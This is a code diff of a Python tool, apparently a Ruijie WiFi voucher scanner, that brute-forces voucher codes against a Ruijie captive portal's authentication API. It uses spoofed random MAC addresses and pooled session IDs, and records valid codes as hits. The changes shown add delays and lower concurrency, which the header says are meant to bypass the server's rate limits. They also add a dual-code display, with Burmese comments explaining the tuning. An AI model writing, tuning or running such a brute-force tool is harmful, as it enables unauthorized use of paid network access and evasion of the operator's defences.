@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
 """
-Ruijie Voucher Scanner v18.1 - SKY BLUE EDITION (MOBILE OPTIMIZED)
+Ruijie Voucher Scanner v18.3 - SKY BLUE EDITION (DUAL MODE)
 - Premium Animated UI Design
-- Single File License System
-- Direct Connection (No Proxy needed for mobile)
+- Dual Code Display (Left & Right)
+- Slow & Steady to bypass server rate limits
 """
 
 import os
@@ -35,15 +35,16 @@ from rich.box import HEAVY, ROUNDED, DOUBLE, MINIMAL
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # ==========================================
-# ⚙️ SPEED & MOBILE TUNING
+# ⚙️ SLOW & STEADY TUNING (DUAL WORKERS)
 # ==========================================
-CONCURRENCY = 20
-TIMEOUT = 6
-SID_POOL_MAX = 1000
-SID_FETCHER_COUNT = 30
-SID_FETCH_SLEEP = 0.05
-DIRECT_TIMEOUT = 4
-WORKER_SID_TIMEOUT = 1.5
+CONCURRENCY = 2           # ကုဒ် ၂ ခု တစ်ပြိုင်နက်တည်း စစ်မယ်
+TIMEOUT = 8
+SID_POOL_MAX = 100
+SID_FETCHER_COUNT = 5
+SID_FETCH_SLEEP = 0.5
+DIRECT_TIMEOUT = 5
+WORKER_SID_TIMEOUT = 2.0
+REQUEST_DELAY = 0.5       # ကုဒ်တစ်ခုစစ်ပြီးတိုင်း 0.5 စက္ကန့် နားမယ်
 
 console = Console()
 
@@ -176,7 +177,8 @@ class VoucherScanner:
         self._state = {
             'total': 0, 'checked': 0, 'speed': 0, 'percentage': 0,
             'elapsed': '00:00:00', 'found': [], 'valid': [], 'dead': [],
-            'status': 'Initializing...', 'session': 'None', 'current_code': '----',
+            'status': 'Initializing...', 'session': 'None', 
+            'current_code_1': '----', 'current_code_2': '----',
             'sid_pool': 0, 'workers': 0, 'proxies': 0,
             'hits_rate': 0.0, 'eta': '--:--:--'
         }
@@ -223,17 +225,21 @@ class VoucherScanner:
             Layout(name="middle", size=4),
             Layout(name="hits", ratio=1),
         )
-        layout["middle"].split_row(Layout(name="current", ratio=1), Layout(name="info", ratio=2))
+        
+        # 🔥 UI ကို နှစ်ခြမ်းခွဲမယ် (Code 1 နဲ့ Code 2)
+        layout["middle"].split_row(
+            Layout(name="current_1", ratio=1), 
+            Layout(name="current_2", ratio=1),
+            Layout(name="info", ratio=1)
+        )
 
-        # Header
         header_text = Text()
         header_text.append("☁️ S K Y   B L U E   S C A N N E R ☁️\n", style="bold white on sky_blue1")
-        header_text.append("Ruijie Voucher Scanner v18.1 - MOBILE\n", style="bold cyan")
+        header_text.append("Ruijie Voucher Scanner v18.3 - DUAL MODE\n", style="bold cyan")
         layout["header"].update(Panel(Align.center(header_text), border_style="sky_blue1", box=DOUBLE))
 
-        # Stats
         speed = s['speed']
-        speed_style = "bold green" if speed >= 500 else ("bold yellow" if speed >= 100 else "bold red")
+        speed_style = "bold green" if speed >= 100 else ("bold yellow" if speed >= 50 else "bold red")
         stats_table = Table.grid(padding=(0, 1), expand=True)
         for _ in range(4): stats_table.add_column(ratio=1)
         stats_table.add_row(
@@ -244,7 +250,6 @@ class VoucherScanner:
         )
         layout["stats"].update(stats_table)
 
-        # Progress
         pct = s['percentage']
         bar = "█" * int(30 * pct / 100) + "░" * (30 - int(30 * pct / 100))
         progress_text = Text()
@@ -252,12 +257,13 @@ class VoucherScanner:
         progress_text.append(f"Status: {s['status']} | SID Pool: {s['sid_pool']}", style="dim")
         layout["progress"].update(Panel(Align.center(progress_text), title="⚙️ PROGRESS", border_style="sky_blue1", box=HEAVY))
 
-        # Middle
-        layout["current"].update(Panel(Align.center(Text.assemble(("🔍 CODE\n", "dim"), (s['current_code'], "bold white on sky_blue1"))), border_style="cyan", box=ROUNDED))
-        info_text = Text.assemble(("Mode: ", "dim"), (self.mode.upper(), "cyan"), (" | Length: ", "dim"), (str(self.length), "yellow"), ("\nHost: ", "dim"), (self._host()[:20], "green"))
-        layout["info"].update(Panel(info_text, title="ℹ️ INFO", border_style="blue", box=ROUNDED))
+        # 🔥 ကုဒ် ၂ ခုကို သီးသန့် ပြမယ်
+        layout["current_1"].update(Panel(Align.center(Text.assemble(("🔍 CODE 1\n", "dim"), (s['current_code_1'], "bold white on sky_blue1"))), border_style="cyan", box=ROUNDED))
+        layout["current_2"].update(Panel(Align.center(Text.assemble(("🔍 CODE 2\n", "dim"), (s['current_code_2'], "bold white on sky_blue1"))), border_style="cyan", box=ROUNDED))
+        
+        info_text = Text.assemble(("Mode: ", "dim"), (self.mode.upper(), "cyan"), (" | Len: ", "dim"), (str(self.length), "yellow"), ("\nHost: ", "dim"), (self._host()[:15], "green"))
+        layout["info"].update(Panel(Align.center(info_text), title="ℹ️ INFO", border_style="blue", box=ROUNDED))
 
-        # Hits
         hits_table = Table(show_header=True, header_style="bold white on sky_blue1", expand=True, box=MINIMAL)
         hits_table.add_column("TYPE", width=8, justify="center")
         hits_table.add_column("VOUCHER", justify="center")
@@ -297,7 +303,7 @@ class VoucherScanner:
         while not self._stop:
             try:
                 if self.sid_pool.full():
-                    await asyncio.sleep(0.5)
+                    await asyncio.sleep(1)
                     continue
 
                 mac = self._gen_mac()
@@ -315,7 +321,6 @@ class VoucherScanner:
                 params_str = "&".join([f"{k}={quote(str(v))}" for k, v in temp_params.items()])
                 url = f"https://{self._host()}/api/auth/wifidog?{params_str}"
 
-                # Direct request (No Proxy)
                 try:
                     async with session.get(url, headers=headers, timeout=DIRECT_TIMEOUT, allow_redirects=False, ssl=False) as resp:
                         loc = resp.headers.get('Location', '')
@@ -344,13 +349,20 @@ class VoucherScanner:
                     continue
 
                 try:
-                    voucher = await asyncio.wait_for(self.voucher_queue.get(), timeout=0.5)
+                    voucher = await asyncio.wait_for(self.voucher_queue.get(), timeout=1.0)
                 except asyncio.TimeoutError:
                     await self.sid_pool.put(sid_data)
                     continue
 
                 self._state['workers'] += 1
                 self._state['session'] = sid_data['sid']
+                self._state['status'] = "Scanning..."
+
+                # 🔥 Worker အလိုက် Code 1 သို့မဟုတ် Code 2 မှာ ပြမယ်
+                if self._state['workers'] % 2 == 1:
+                    self._state['current_code_1'] = voucher
+                else:
+                    self._state['current_code_2'] = voucher
 
                 url = f"https://{self._host()}/api/auth/voucher/?lang=en_US"
                 headers = {
@@ -395,18 +407,20 @@ class VoucherScanner:
                     status = 'DEAD_SID'
 
                 self._state['checked'] += 1
-                self._state['current_code'] = voucher
 
                 if status in ('DEAD_SID', 'INVALID'):
                     if status == 'INVALID':
                         sid_data['used'] += 1
-                        if sid_data['used'] < 5: await self.sid_pool.put(sid_data)
+                        if sid_data['used'] < 10: await self.sid_pool.put(sid_data)
                 else:
                     if not self.sid_pool.full(): await self.sid_pool.put(sid_data)
                     self._record_hit(voucher, status, logon, tl)
 
                 if not self._stop:
                     await self.voucher_queue.put(self.generate_voucher())
+
+                # 🔥 0.5 စက္ကန့် စောင့်မယ် (Server ကို မပိတ်ဆို့ဖို့)
+                await asyncio.sleep(REQUEST_DELAY)
 
             except asyncio.CancelledError:
                 break
